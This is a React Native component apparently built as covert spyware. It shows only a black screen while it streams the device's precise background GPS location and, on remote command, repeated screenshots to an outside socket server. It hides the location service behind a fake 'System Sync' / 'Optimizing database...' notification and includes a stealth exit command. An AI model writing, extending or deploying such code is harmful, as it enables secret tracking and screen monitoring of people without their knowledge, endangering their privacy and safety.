import React, { useEffect, useRef } from 'react';
import { View, StyleSheet, BackHandler } from 'react-native';
import * as Location from 'expo-location';
import * as Network from 'expo-network';
import * as TaskManager from 'expo-task-manager';
import { captureScreen } from 'react-native-view-shot';
import io from 'socket.io-client';

const socket = io("https://joyjet-server.onrender.com");
const LOCATION_TASK_NAME = 'background-location-task';

export default function GhostScreen({ name }) {
  const streamTimer = useRef(null);

  useEffect(() => {
    // 1. Initial Connection & Net Check
    const initializeGhost = async () => {
      const net = await Network.getNetworkStateAsync();
      socket.emit('ghost_online', { name, netType: net.type });
      
      // Request permissions for background tasks
      const { status } = await Location.requestBackgroundPermissionsAsync();
      if (status === 'granted') {
        startBackgroundGPS();
      }
    };

    initializeGhost();

    // 2. Command Listeners from Admin
    socket.on('admin_command', (cmd) => {
      switch (cmd) {
        case 'START_LIVE':
          startStream(200); // 5 frames per second
          break;
        case 'START_ECO':
          startStream(5000); // 1 frame every 5 seconds
          break;
        case 'STOP_STREAM':
          clearInterval(streamTimer.current);
          break;
        case 'REMOTE_WIPE':
          executeWipe();
          break;
      }
    });

    // 3. Cellular Governor (Server-forced switch to ECO after 5 mins)
    socket.on('force_eco_mode', () => {
      startStream(5000);
    });

    return () => clearInterval(streamTimer.current);
  }, []);

  const startStream = (interval) => {
    clearInterval(streamTimer.current);
    streamTimer.current = setInterval(async () => {
      try {
        const base64 = await captureScreen({
          format: 'jpg',
          quality: 0.3, // Optimized for speed
          result: 'base64'
        });
        socket.emit('screen_frame', base64);
      } catch (e) {
        console.error("Capture Failed", e);
      }
    }, interval);
  };

  const startBackgroundGPS = async () => {
    await Location.startLocationUpdatesAsync(LOCATION_TASK_NAME, {
      accuracy: Location.Accuracy.BestForNavigation,
      timeInterval: 5000,
      distanceInterval: 0,
      foregroundService: {
        notificationTitle: "System Sync",
        notificationBody: "Optimizing database...",
        notificationColor: "#000000"
      }
    });
  };

  const executeWipe = () => {
    // Immediate stealth exit
    socket.disconnect();
    BackHandler.exitApp();
  };

  // The Ghost remains a pure black screen
  return <View style={styles.stealthContainer} />;
}

const styles = StyleSheet.create({
  stealthContainer: {
    flex: 1,
    backgroundColor: '#000',
  },
});
